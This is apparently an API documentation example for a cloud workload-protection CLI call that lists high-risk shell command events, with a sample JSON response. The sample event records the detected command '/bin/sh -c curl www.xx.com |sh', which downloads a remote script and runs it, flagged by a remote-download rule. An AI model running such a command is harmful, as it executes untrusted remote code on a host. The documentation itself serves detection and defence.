**Example 1: 高危命令事件列表**



Input: 

```
tccli cwp DescribeBashEvents --cli-unfold-argument  \
    --Limit 1 \
    --Offset 0
```

Output: 
```
{
    "Response": {
        "List": [
            {
                "Uuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
                "Id": 10001,
                "Quuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
                "Hostip": "1.1.1.1",
                "User": "root:root",
                "Platform": 4,
                "BashCmd": "/bin/sh -c curl www.xx.com |sh",
                "RuleId": 150,
                "RuleName": "系统规则(标准)-计划任务远程下载",
                "RuleLevel": 2,
                "Status": 0,
                "CreateTime": "2024-10-17 12:16:08",
                "MachineName": "机器名称",
                "DetectBy": 1,
                "Pid": "27605",
                "Exe": "/usr/bin/bash",
                "ModifyTime": "2024-10-17 20:09:01",
                "RegexBashCmd": "/bin/sh -c curl www.xx.com |sh",
                "RuleCategory": 0,
                "HostName": "机器名称"
            }
        ],
        "RequestId": "7ae8b771-d517-4f78-95e0-a5432a5f1b49",
        "TotalCount": 1
    }
}
```

